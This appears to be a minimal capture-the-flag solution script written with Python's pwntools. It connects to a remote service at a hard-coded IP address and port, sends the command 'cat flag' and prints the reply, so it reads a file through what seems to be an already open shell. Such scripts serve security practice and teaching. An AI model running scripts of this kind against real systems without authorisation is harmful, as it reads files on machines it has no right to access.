from pwn import *

p = remote("111.198.29.45" , 30280)

p.sendline("cat flag")
print(p.recvline())